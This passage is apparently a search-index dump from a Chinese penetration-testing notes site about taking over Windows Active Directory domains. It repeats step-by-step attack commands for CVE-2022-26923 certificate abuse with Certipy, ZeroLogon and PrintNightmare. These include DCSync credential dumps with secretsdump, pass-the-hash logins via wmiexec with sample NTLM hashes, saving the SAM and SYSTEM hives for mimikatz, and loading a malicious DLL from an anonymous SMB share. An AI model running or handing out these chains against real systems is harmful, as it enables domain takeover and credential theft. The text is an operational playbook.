\u6dfb\u52a0\u4e00\u4e2a\u673a\u5668\u8d26\u6237\uff0c\u5e76\u8bbe\u7f6e\u5176dnshostname\u6539\u4e3a\u4e0edc\u76f8\u540c certipy account create chinfo.testlab/test1:'Syclover!'@DC.chinfo.testlab -user \"hacker\" -dns \"DC.chinfo.testlab\" \u5982\u679c\u62a5\u9519\u5c31\u6362\u79cd\u5199\u6cd5 certipy account create -u gasstest2@a.com.cn -p 'asdnsad' -user 'aa' -dns 'DC1$' -dc-ip 192.168.1.1 \u83b7\u53d6\u673a\u5668\u8d26\u6237\u7684machine\u8bc1\u4e66 certipy req chinfo.testlab/'hacker$:Qv8A7bBHFtwpPhRj'@DC.chinfo.testlab -ca chinfo-DC-CA -template Machine \u83b7\u5f97\u673a\u5668\u8d26\u6237\u7684hash certipy auth -pfx dc.pfx \u6b64\u65f6\u83b7\u5f97\u7684hash\u662fdc\u673a\u5668\u7528\u6237\u7684hash\uff0c\u8fd9\u4e2ahash\u4e0d\u80fd\u76f4\u63a5\u62ff\u6765\u767b\u5f55\uff0c\u4f46\u662f\u53ef\u4ee5\u62ff\u6765dcsync\u83b7\u53d6hash python3 /usr/share/doc/python3-impacket/examples/secretsdump.py 'chinfo.testlab/dc$@dc.chinfo.testlab' -hashes b0d7d9976a8006c910f50030088730f8:b0d7d9976a8006c910f50030088730f8 \u83b7\u53d6hash\u540e\u8fdb\u884c\u6a2a\u5411 python3 /usr/share/doc/python3-impacket/examples/wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:2fd54b5d964ccb69be6bdb69d76fad65 ADMINISTRATOR@1.1.1.2","title":"CVE-2022-26963AD\u57df\u6743\u9650\u63d0\u5347"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%AE%A1%E6%8F%90%E6%9D%83%E4%B8%80%E6%8A%8A%E6%A2%AD/CVE-2022-26963AD%E5%9F%9F%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/CVE-2022-26963AD%E5%9F%9F%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/#cve-2022-26963ad","text":"","title":"CVE-2022-26963AD\u57df\u6743\u9650\u63d0\u5347"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%AE%A1%E6%8F%90%E6%9D%83%E4%B8%80%E6%8A%8A%E6%A2%AD/CVE-2022-26963AD%E5%9F%9F%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/CVE-2022-26963AD%E5%9F%9F%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/#_1","text":"\u653b\u51fb \u53d7\u5f71\u54cd\u7684 Windows \u7248\u672c\uff1a Windows 8.1 Windows 10 Version 1607, 1809,1909, 2004, 20H2, 21H1, 21H2 Windows 11 Windows Server 2008\uff0c2012\uff0c2016\uff0c2019\uff0c2022 \u7531\u4e8e\u8ba1\u7b97\u673a\u8d26\u6237\u4e2d\u7684dNSHostName\u4e0d\u5177\u6709\u552f\u4e00\u6027\uff0c\u53ef\u4ee5\u5bf9\u5176\u8fdb\u884c\u4f2a\u9020\uff0c\u5192\u5145\u9ad8\u6743\u9650\u7684\u57df\u7a7a\u673a\u5668\u8d26\u6237\uff0c\u5b9e\u73b0\u6743\u9650\u63d0\u5347\u7684\u6548\u679c \u6f0f\u6d1e\u5229\u7528\u6761\u4ef6\uff1a \u80fd\u591f\u521b\u5efa\u673a\u5668\u8d26\u6237\uff08\u6216\u62e5\u6709\u67d0\u673a\u5668\u8d26\u6237\u7684\u63a7\u5236\u6743\uff09 \u5bf9\u673a\u5668\u8d26\u6237\u5177\u6709\u4fee\u6539\u5c5e\u6027\u7684\u6743\u9650 \u76ee\u6807\u672a\u6253\u76f8\u5e94\u8865\u4e01","title":"\u76ee\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%AE%A1%E6%8F%90%E6%9D%83%E4%B8%80%E6%8A%8A%E6%A2%AD/CVE-2022-26963AD%E5%9F%9F%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/CVE-2022-26963AD%E5%9F%9F%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/#_2","text":"https://github.com/ly4k/Certipy \u6dfb\u52a0\u4e00\u4e2a\u673a\u5668\u8d26\u6237\uff0c\u5e76\u8bbe\u7f6e\u5176dnshostname\u6539\u4e3a\u4e0edc\u76f8\u540c certipy account create chinfo.testlab/test1:'Syclover!'@DC.chinfo.testlab -user \"hacker\" -dns \"DC.chinfo.testlab\" \u5982\u679c\u62a5\u9519\u5c31\u6362\u79cd\u5199\u6cd5 certipy account create -u gasstest2@a.com.cn -p 'asdnsad' -user 'aa' -dns 'DC1$' -dc-ip 192.168.1.1 \u83b7\u53d6\u673a\u5668\u8d26\u6237\u7684machine\u8bc1\u4e66 certipy req chinfo.testlab/'hacker$:Qv8A7bBHFtwpPhRj'@DC.chinfo.testlab -ca chinfo-DC-CA -template Machine \u83b7\u5f97\u673a\u5668\u8d26\u6237\u7684hash certipy auth -pfx dc.pfx \u6b64\u65f6\u83b7\u5f97\u7684hash\u662fdc\u673a\u5668\u7528\u6237\u7684hash\uff0c\u8fd9\u4e2ahash\u4e0d\u80fd\u76f4\u63a5\u62ff\u6765\u767b\u5f55\uff0c\u4f46\u662f\u53ef\u4ee5\u62ff\u6765dcsync\u83b7\u53d6hash python3 /usr/share/doc/python3-impacket/examples/secretsdump.py 'chinfo.testlab/dc$@dc.chinfo.testlab' -hashes b0d7d9976a8006c910f50030088730f8:b0d7d9976a8006c910f50030088730f8 \u83b7\u53d6hash\u540e\u8fdb\u884c\u6a2a\u5411 python3 /usr/share/doc/python3-impacket/examples/wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:2fd54b5d964ccb69be6bdb69d76fad65 ADMINISTRATOR@1.1.1.2","title":"\u653b\u51fb"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%AE%A1%E6%8F%90%E6%9D%83%E4%B8%80%E6%8A%8A%E6%A2%AD/ZeroLogon%20CVE-2020-1472/ZeroLogon%20CVE-2020-1472/","text":"ZeroLogon CVE-2020-1472 ref: https://xz.aliyun.com/t/8367#toc-1 https://www.anquanke.com/post/id/219374#h3-3 \u8fd9\u4e2a\u6d1e\u53ef\u4ee5\u628a\u57df\u63a7\u7684\u673a\u5668\u8d26\u6237\u5bc6\u7801\u7f6e\u7a7a\uff08AD\u91cc\u9762\u7f6e\u7a7a\uff0c\u672c\u673alssas\u5e76\u6ca1\u6709\uff0c\u53ef\u901a\u8fc7\u6b64\u7279\u6027\u6765\u6062\u590d\u5bc6\u7801\uff09\uff0c\u6211\u4eec\u76f8\u5f53\u4e8e\u5bf9\u5b83\u5df2\u77e5\u5bc6\u7801\uff0c\u4fbf\u53ef\u4ee5\u901a\u8fc7DCSync\u628a\u6574\u4e2a\u57df\u7684\u51ed\u636e\u5bfc\u51fa\uff08\u6211\u4eec\u5df2\u77e5\u57df\u63a7\u673a\u5668\u8d26\u6237\u7684\u5bc6\u7801\u4e3a\u4ec0\u4e48\u4e0d\u76f4\u63a5\u767b\u9646\u4e0a\u53bb\u5462\uff1f\u56e0\u4e3a\u57df\u63a7\u673a\u5668\u8d26\u6237\u9ed8\u8ba4\u4e0d\u53ef\u767b\u5f55\uff0c\u53ea\u80fd\u7528DCSync\u8fdc\u7a0b\u5bfc\u51fa\u51ed\u636e\uff09\uff0c\u4ece\u800c\u83b7\u53d6\u57df\u7ba1hash\uff0c\u4ece\u800c\u63a5\u7ba1\u57df\u3002 \u524d\u63d0\uff1a\u80fd\u8bbf\u95ee\u5230\u57df\u63a7\u7684445\u7aef\u53e3\uff08SMB\u7aef\u53e3\uff09 CVE-2020-1472 exp: https://github.com/risksense/zerologon or https://github.com/SecuraBV/CVE-2020-1472 python3 cve-2020-1472-exploit.py DC 10.10.10.10 \u901a\u8fc7\u5bc6\u7801dump\u5168\u57dfhash \u4f7f\u7528impacket\u5de5\u5177\u5305\u91cc\u7684secretsdump.py https://github.com/fortra/impacket/blob/master/examples/secretsdump.py python3 secretsdump.py de1ay/DC\\$@10.10.10.10 -no-pass \u627e\u5230\u7ba1\u7406\u5458hash\uff0c\u7136\u540e\u4f7f\u7528impacket\u5de5\u5177\u5305\u91cc\u7684wmiexec.py\u62ff\u4e0b\u57df\u63a7 https://github.com/fortra/impacket/blob/master/examples/wmiexec.py python3 wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24 Administrator@10.10.10.10 \u628a\u57df\u63a7\u673a\u5668\u8d26\u6237\u5bc6\u7801\u7f6e\u7a7a\u4e86\uff0c\u8981\u5f00\u59cb\u8003\u8651\u4e00\u4e0b\u6062\u590d\u7684\u95ee\u9898\u4e86\u3002 \u6211\u4eec\u5148\u4ece\u6ce8\u518c\u8868/lsass\u91cc\u9762\u8bfb\u53d6\u673a\u5668\u7528\u6237\u539f\u5148\u7684hash \u6216\u8005\u8fd9\u6837\u62ff reg save HKLM\\SYSTEM SYSTEM reg save HKLM\\SAM SAM \u5728\u8fdc\u7aefshell\u4f7f\u7528\u4ee5\u4e0a\u547d\u4ee4\u5bfc\u51faSYSTEM \u548c SAM\u6587\u4ef6\uff0c\u5e76\u5c06\u5176\u5f85\u4f1a\u672c\u5730\uff0c\u7531mimikatz\u5206\u6790 mimikatz\u8fd0\u884c mimikatz # lsadump::sam /sam:SAM /system:SYSTEM Domain : STU1 SysKey : fd4639f4e27c79683ae9fee56b44393f Local SID : S-1-5-21-1982601180-2087634876-2293013296 SAMKey : 099d1915db1b0e5cf41f1f0908dc7e17 RID : 000001f4 (500) User : Administrator Hash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0 RID : 000001f5 (501) User : Guest RID : 000003e8 (1000) User : liukaifeng01 Hash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0 \u7136\u540e\u901a\u8fc7exp\u4e0b\u9762\u7684\u811a\u672c\u8fd8\u539f\u5bc6\u7801 https://github.com/dirkjanm/CVE-2020-1472/blob/master/restorepassword.py \u6216\u8005\u4e0d\u62fflssas\u7684hash\uff0c\u76f4\u63a5\u901a\u8fc7\u78b0\u649e\u6765\u8fd8\u539f\u5bc6\u7801\uff0c\u6bd4\u8f83\u66b4\u529b\uff0c\u8fd8\u662f\u7528\u4e0a\u9762\u90a3\u4e2a\u597d\u70b9 https://github.com/risksense/zerologon/blob/master/reinstall_original_pw.py windows server 08-19 \u90fd\u80fd\u6253\uff0c\u4f46\u662f\u628a\u57df\u63a7\u5bc6\u7801\u7f6e\u7a7a\u53ef\u80fd\u4f1a\u5bfc\u81f4\u8131\u57df(AD\u91cc\u9762\u5b58\u50a8\u7684\u673a\u5668\u5bc6\u7801\u8ddf\u672c\u673a\u7684Lsass\u91cc\u9762\u5b58\u50a8\u7684\u5bc6\u7801\u4e0d\u4e00\u5b9a\u5bfc\u81f4\u7684)\uff0c\u614e\u7528","title":"ZeroLogon CVE-2020-1472"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%AE%A1%E6%8F%90%E6%9D%83%E4%B8%80%E6%8A%8A%E6%A2%AD/ZeroLogon%20CVE-2020-1472/ZeroLogon%20CVE-2020-1472/#zerologon-cve-2020-1472","text":"ref: https://xz.aliyun.com/t/8367#toc-1 https://www.anquanke.com/post/id/219374#h3-3 \u8fd9\u4e2a\u6d1e\u53ef\u4ee5\u628a\u57df\u63a7\u7684\u673a\u5668\u8d26\u6237\u5bc6\u7801\u7f6e\u7a7a\uff08AD\u91cc\u9762\u7f6e\u7a7a\uff0c\u672c\u673alssas\u5e76\u6ca1\u6709\uff0c\u53ef\u901a\u8fc7\u6b64\u7279\u6027\u6765\u6062\u590d\u5bc6\u7801\uff09\uff0c\u6211\u4eec\u76f8\u5f53\u4e8e\u5bf9\u5b83\u5df2\u77e5\u5bc6\u7801\uff0c\u4fbf\u53ef\u4ee5\u901a\u8fc7DCSync\u628a\u6574\u4e2a\u57df\u7684\u51ed\u636e\u5bfc\u51fa\uff08\u6211\u4eec\u5df2\u77e5\u57df\u63a7\u673a\u5668\u8d26\u6237\u7684\u5bc6\u7801\u4e3a\u4ec0\u4e48\u4e0d\u76f4\u63a5\u767b\u9646\u4e0a\u53bb\u5462\uff1f\u56e0\u4e3a\u57df\u63a7\u673a\u5668\u8d26\u6237\u9ed8\u8ba4\u4e0d\u53ef\u767b\u5f55\uff0c\u53ea\u80fd\u7528DCSync\u8fdc\u7a0b\u5bfc\u51fa\u51ed\u636e\uff09\uff0c\u4ece\u800c\u83b7\u53d6\u57df\u7ba1hash\uff0c\u4ece\u800c\u63a5\u7ba1\u57df\u3002 \u524d\u63d0\uff1a\u80fd\u8bbf\u95ee\u5230\u57df\u63a7\u7684445\u7aef\u53e3\uff08SMB\u7aef\u53e3\uff09 CVE-2020-1472 exp: https://github.com/risksense/zerologon or https://github.com/SecuraBV/CVE-2020-1472 python3 cve-2020-1472-exploit.py DC 10.10.10.10 \u901a\u8fc7\u5bc6\u7801dump\u5168\u57dfhash \u4f7f\u7528impacket\u5de5\u5177\u5305\u91cc\u7684secretsdump.py https://github.com/fortra/impacket/blob/master/examples/secretsdump.py python3 secretsdump.py de1ay/DC\\$@10.10.10.10 -no-pass \u627e\u5230\u7ba1\u7406\u5458hash\uff0c\u7136\u540e\u4f7f\u7528impacket\u5de5\u5177\u5305\u91cc\u7684wmiexec.py\u62ff\u4e0b\u57df\u63a7 https://github.com/fortra/impacket/blob/master/examples/wmiexec.py python3 wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24 Administrator@10.10.10.10 \u628a\u57df\u63a7\u673a\u5668\u8d26\u6237\u5bc6\u7801\u7f6e\u7a7a\u4e86\uff0c\u8981\u5f00\u59cb\u8003\u8651\u4e00\u4e0b\u6062\u590d\u7684\u95ee\u9898\u4e86\u3002 \u6211\u4eec\u5148\u4ece\u6ce8\u518c\u8868/lsass\u91cc\u9762\u8bfb\u53d6\u673a\u5668\u7528\u6237\u539f\u5148\u7684hash \u6216\u8005\u8fd9\u6837\u62ff reg save HKLM\\SYSTEM SYSTEM reg save HKLM\\SAM SAM \u5728\u8fdc\u7aefshell\u4f7f\u7528\u4ee5\u4e0a\u547d\u4ee4\u5bfc\u51faSYSTEM \u548c SAM\u6587\u4ef6\uff0c\u5e76\u5c06\u5176\u5f85\u4f1a\u672c\u5730\uff0c\u7531mimikatz\u5206\u6790 mimikatz\u8fd0\u884c mimikatz # lsadump::sam /sam:SAM /system:SYSTEM Domain : STU1 SysKey : fd4639f4e27c79683ae9fee56b44393f Local SID : S-1-5-21-1982601180-2087634876-2293013296 SAMKey : 099d1915db1b0e5cf41f1f0908dc7e17 RID : 000001f4 (500) User : Administrator Hash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0 RID : 000001f5 (501) User : Guest RID : 000003e8 (1000) User : liukaifeng01 Hash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0 \u7136\u540e\u901a\u8fc7exp\u4e0b\u9762\u7684\u811a\u672c\u8fd8\u539f\u5bc6\u7801 https://github.com/dirkjanm/CVE-2020-1472/blob/master/restorepassword.py \u6216\u8005\u4e0d\u62fflssas\u7684hash\uff0c\u76f4\u63a5\u901a\u8fc7\u78b0\u649e\u6765\u8fd8\u539f\u5bc6\u7801\uff0c\u6bd4\u8f83\u66b4\u529b\uff0c\u8fd8\u662f\u7528\u4e0a\u9762\u90a3\u4e2a\u597d\u70b9 https://github.com/risksense/zerologon/blob/master/reinstall_original_pw.py windows server 08-19 \u90fd\u80fd\u6253\uff0c\u4f46\u662f\u628a\u57df\u63a7\u5bc6\u7801\u7f6e\u7a7a\u53ef\u80fd\u4f1a\u5bfc\u81f4\u8131\u57df(AD\u91cc\u9762\u5b58\u50a8\u7684\u673a\u5668\u5bc6\u7801\u8ddf\u672c\u673a\u7684Lsass\u91cc\u9762\u5b58\u50a8\u7684\u5bc6\u7801\u4e0d\u4e00\u5b9a\u5bfc\u81f4\u7684)\uff0c\u614e\u7528","title":"ZeroLogon CVE-2020-1472"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%AE%A1%E6%8F%90%E6%9D%83%E4%B8%80%E6%8A%8A%E6%A2%AD/printnightmare%EF%BC%88CVE-2021-1675%EF%BC%89/printnightmare%EF%BC%88CVE-2021-1675%EF%BC%89/","text":"printnightmare\uff08CVE-2021-1675\uff09 \u76ee\u5f55 \u590d\u73b0 \u626b\u63cf \u5f00\u542fsmb linux\u5f00\u542f\u533f\u540dsmb windows\u5f00\u542f\u533f\u540dsmb windows\u5f00\u542f\u533f\u540dsmb:\u4e00\u952e\u811a\u672c exp \u8c01\u90fd\u80fd\u6253\uff0c\u4e0d\u5c40\u9650\u4e8e\u57df\u63a7\u3002\u5de5\u4f5c\u7ec4\u73af\u5883\u4e5f\u80fd\u62ff\u6765\u6a2a\u79fb\u3002 Windows Print Spooler\u662fWindows\u7684\u6253\u5370\u673a\u540e\u53f0\u5904\u7406\u7a0b\u5e8f\uff0c\u5e7f\u6cdb\u7684\u5e94\u7528\u4e8e\u5404\u79cd\u5185\u7f51\u4e2d\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u8be5\u6f0f\u6d1e\u7ed5\u8fc7PfcAddPrinterDriver\u7684\u5b89\u5168\u9a8c\u8bc1\uff0c\u5e76\u5728\u6253\u5370\u670d\u52a1\u5668\u4e2d\u5b89\u88c5\u6076\u610f\u7684\u9a71\u52a8\u7a0b\u5e8f\u3002\u82e5\u653b\u51fb\u8005\u6240\u63a7\u5236\u7684\u7528\u6237\u5728\u57df\u4e2d\uff0c\u5219\u653b\u51fb\u8005\u53ef\u4ee5\u8fde\u63a5\u5230DC\u4e2d\u7684Spooler\u670d\u52a1\uff0c\u5e76\u5229\u7528\u8be5\u6f0f\u6d1e\u5728DC\u4e2d\u5b89\u88c5\u6076\u610f\u7684\u9a71\u52a8\u7a0b\u5e8f\uff0c\u5b8c\u6574\u7684\u63a7\u5236\u6574\u4e2a\u57df\u73af\u5883\u3002 \u524d\u63d0\uff1a \u76ee\u6807\u5f00\u542fSpooler\u670d\u52a1 \u521b\u5efa\u7684smb\u670d\u52a1\u5141\u8bb8\u533f\u540d\u8bbf\u95ee\uff0c\u5373\u76ee\u6807\u53ef\u4ee5\u76f4\u63a5\u83b7\u53d6\u5230\u6587\u4ef6 \u9700\u81ea\u5236\u6076\u610fdll \u590d\u73b0 \u626b\u63cf \u53ef\u901a\u8fc7\u5982\u4e0b\u547d\u4ee4\u770b\u6307\u5b9a\u8ba1\u7b97\u673a\u662f\u5426\u5f00\u542fspooler\u670d\u52a1 rpcdump.py @192.168.1.10 | egrep 'MS-RPRN|MS-PAR' Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol Protocol: [MS-RPRN]: Print System Remote Protocol \u5f00\u542fsmb linux\u5f00\u542f\u533f\u540dsmb \u7528apt\u6216\u8005yum\u4e0b\u8f7dsamba\uff0c\u7136\u540e\u4fee\u6539/etc/samba/smb.conf\u3002\u5c06/tmp/\u6620\u5c04\u4e3asmb\u5171\u4eab\u76ee\u5f55\u3002 [global] map to guest = Bad User server role = standalone server usershare allow guests = yes idmap config * : backend = tdb smb ports = 445 [smb] comment = Samba path = /tmp/ guest ok = yes read only = no browsable = yes force user = smbuser \u7136\u540e\u4f7f\u7528\u547d\u4ee4 service smbd start \u5f00\u542fsmb\u670d\u52a1\u5668\u3002 windows\u5f00\u542f\u533f\u540dsmb 1.\u542f\u7528Guest\u7528\u6237 net user guest /active:yes 2.\u5c06Everyone\u6743\u9650\u5e94\u7528\u4e8e\u533f\u540d\u7528\u6237 REG ADD \"HKLM\\System\\CurrentControlSet\\Control\\Lsa\" /v EveryoneIncludesAnonymous /t REG_DWORD /d 1 /f 3.\u6307\u5b9a\u533f\u540d\u5171\u4eab\u6587\u4ef6\u7684\u4f4d\u7f6e REG ADD \"HKLM\\System\\CurrentControlSet\\Services\\LanManServer\\Parameters\" /v NullSessionShares /t REG_MULTI_SZ /d smb /f 4.\u5c06Guest\u7528\u6237\u4ece\u7b56\u7565\u201c\u62d2\u7edd\u4ece\u7f51\u7edc\u8bbf\u95ee\u8fd9\u53f0\u8ba1\u7b97\u673a\u201d\u4e2d\u79fb\u9664 \u5bfc\u51fa\u7ec4\u7b56\u7565\uff1a secedit /export /cfg gp.inf /quiet \u4fee\u6539\u6587\u4ef6gp.inf\uff0c\u5c06 SeDenyNetworkLogonRight = Guest \u4fee\u6539\u4e3a SeDenyNetworkLogonRight = \uff0c\u4fdd\u5b58 \u91cd\u65b0\u5bfc\u5165\u7ec4\u7b56\u7565\uff1a secedit /configure /db gp.sdb /cfg gp.inf /quiet \u5f3a\u5236\u5237\u65b0\u7ec4\u7b56\u7565\uff0c\u7acb\u5373\u751f\u6548(\u5426\u5219\uff0c\u91cd\u542f\u540e\u751f\u6548)\uff1a gpupdate/force 5.\u8bbe\u7f6e\u6587\u4ef6\u5171\u4eab icacls C:\\share\\ /T /grant Everyone:r net share share=c:\\share /grant:everyone,full \u81f3\u6b64\uff0c\u53ef\u533f\u540d\u8bbf\u95ee\u7684\u6587\u4ef6\u5171\u4eab\u670d\u52a1\u5668\u5f00\u542f\u6210\u529f\uff0c\u8bbf\u95ee\u7684\u5730\u5740\u4e3a //<ip>/smb \u592a\u957f\u4e0d\u770b\u7248(\u4f3c\u4e4e\u8981\u91cd\u542f\u624d\u80fd\u751f\u6548)\uff1a mkdir C:\\share icacls C:\\share\\ /T /grant Anonymous` logon:r icacls C:\\share\\ /T /grant Everyone:r New-SmbShare -Path C:\\share -Name share -ReadAccess 'ANONYMOUS LOGON','Everyone' REG ADD \"HKLM\\System\\CurrentControlSet\\Services\\LanManServer\\Parameters\" /v NullSessionPipes /t REG_MULTI_SZ /d srvsvc /f #This will overwrite existing NullSessionPipes REG ADD \"HKLM\\System\\CurrentControlSet\\Services\\LanManServer\\Parameters\" /v NullSessionShares /t REG_MULTI_SZ /d share /f REG ADD \"HKLM\\System\\CurrentControlSet\\Control\\Lsa\" /v EveryoneIncludesAnonymous /t REG_DWORD /d 1 /f REG ADD \"HKLM\\System\\CurrentControlSet\\Control\\Lsa\" /v RestrictAnonymous /t REG_DWORD /d 0 /f # Reboot windows\u5f00\u542f\u533f\u540dsmb:\u4e00\u952e\u811a\u672c https://github.com/3gstudent/Invoke-BuildAnonymousSMBServer \u652f\u6301\u57df\u73af\u5883\u548c\u5de5\u4f5c\u7ec4\u73af\u5883\u7684Windows\u64cd\u4f5c\u7cfb\u7edf \u9700\u8981\u672c\u5730\u7ba1\u7406\u5458\u6743\u9650\u6267\u884c \u5f00\u542f\u53ef\u533f\u540d\u8bbf\u95ee\u7684\u6587\u4ef6\u5171\u4eab\u670d\u52a1\u5668\uff1a Invoke-BuildAnonymousSMBServer -Path c:\\share -Mode Enable \u5173\u95ed\u53ef\u533f\u540d\u8bbf\u95ee\u7684\u6587\u4ef6\u5171\u4eab\u670d\u52a1\u5668\uff1a Invoke-BuildAnonymousSMBServer -Path c:\\share -Mode Disable exp python\u7248\u7684exp\uff0cimpacket\u6846\u67b6\u4e8c\u5f00\u3002 https://github.com/cube0x0/CVE-2021-1675 ./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 '\\\\192.168.1.215\\smb\\addCube.dll' ./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 'C:\\addCube.dll'","title":"printnightmare\uff08CVE-2021-1675\uff09"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%AE%A1%E6%8F%90%E6%9D%83%E4%B8%80%E6%8A%8A%E6%A2%AD/printnightmare%EF%BC%88CVE-2021-1675%EF%BC%89/printnightmare%EF%BC%88CVE-2021-1675%EF%BC%89/#printnightmarecve-2021-1675","text":"","title":"printnightmare\uff08CVE-2021-1675\uff09"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%AE%A1%E6%8F%90%E6%9D%83%E4%B8%80%E6%8A%8A%E6%A2%AD/printnightmare%EF%BC%88CVE-2021-1675%EF%BC%89/printnightmare%EF%BC%88CVE-2021-1675%EF%BC%89/#_1","text":"\u590d\u73b0 \u626b\u63cf \u5f00\u542fsmb linux\u5f00\u542f\u533f\u540dsmb windows\u5f00\u542f\u533f\u540dsmb windows\u5f00\u542f\u533f\u540dsmb:\u4e00\u952e\u811a\u672c exp \u8c01\u90fd\u80fd\u6253\uff0c\u4e0d\u5c40\u9650\u4e8e\u57df\u63a7\u3002\u5de5\u4f5c\u7ec4\u73af\u5883\u4e5f\u80fd\u62ff\u6765\u6a2a\u79fb\u3002 Windows Print Spooler\u662fWindows\u7684\u6253\u5370\u673a\u540e\u53f0\u5904\u7406\u7a0b\u5e8f\uff0c\u5e7f\u6cdb\u7684\u5e94\u7528\u4e8e\u5404\u79cd\u5185\u7f51\u4e2d\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u8be5\u6f0f\u6d1e\u7ed5\u8fc7PfcAddPrinterDriver\u7684\u5b89\u5168\u9a8c\u8bc1\uff0c\u5e76\u5728\u6253\u5370\u670d\u52a1\u5668\u4e2d\u5b89\u88c5\u6076\u610f\u7684\u9a71\u52a8\u7a0b\u5e8f\u3002\u82e5\u653b\u51fb\u8005\u6240\u63a7\u5236\u7684\u7528\u6237\u5728\u57df\u4e2d\uff0c\u5219\u653b\u51fb\u8005\u53ef\u4ee5\u8fde\u63a5\u5230DC\u4e2d\u7684Spooler\u670d\u52a1\uff0c\u5e76\u5229\u7528\u8be5\u6f0f\u6d1e\u5728DC\u4e2d\u5b89\u88c5\u6076\u610f\u7684\u9a71\u52a8\u7a0b\u5e8f\uff0c\u5b8c\u6574\u7684\u63a7\u5236\u6574\u4e2a\u57df\u73af\u5883\u3002 \u524d\u63d0\uff1a \u76ee\u6807\u5f00\u542fSpooler\u670d\u52a1 \u521b\u5efa\u7684smb\u670d\u52a1\u5141\u8bb8\u533f\u540d\u8bbf\u95ee\uff0c\u5373\u76ee\u6807\u53ef\u4ee5\u76f4\u63a5\u83b7\u53d6\u5230\u6587\u4ef6 \u9700\u81ea\u5236\u6076\u610fdll","title":"\u76ee\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%AE%A1%E6%8F%90%E6%9D%83%E4%B8%80%E6%8A%8A%E6%A2%AD/printnightmare%EF%BC%88CVE-2021-1675%EF%BC%89/printnightmare%EF%BC%88CVE-2021-1675%EF%BC%89/#_2","text":"","title":"\u590d\u73b0"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%AE%A1%E6%8F%90%E6%9D%83%E4%B8%80%E6%8A%8A%E6%A2%AD/printnightmare%EF%BC%88CVE-2021-1675%EF%BC%89/printnightmare%EF%BC%88CVE-2021-1675%EF%BC%89/#_3","text":"\u53ef\u901a\u8fc7\u5982\u4e0b\u547d\u4ee4\u770b\u6307\u5b9a\u8ba1\u7b97\u673a\u662f\u5426\u5f00\u542fspooler\u670d\u52a1 rpcdump.py @192.168.1.10 | egrep 'MS-RPRN|MS-PAR' Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol Protocol: [MS-RPRN]: Print System Remote 